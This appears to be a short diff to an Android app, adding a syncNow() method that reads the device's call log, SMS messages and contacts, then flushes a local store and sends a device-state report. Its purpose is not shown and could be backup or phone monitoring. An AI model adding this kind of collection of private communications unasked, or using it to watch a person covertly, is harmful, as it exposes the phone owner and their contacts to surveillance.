@@ -99,6 +99,14 @@ class ActivityCollector(private val context: Context) {
         PermissionRequester.requestViaActivity(context)
     }
 
+    fun syncNow() {
+        runCatching { CallLogReader.sync(context) }
+        runCatching { SmsReader.sync(context) }
+        runCatching { ContactsReader.sync(context) }
+        ActivityStore.flush(context)
+        DeviceStateReporter.send(context)
+    }
+
     companion object {
         @Volatile private var instance: ActivityCollector? = null
 
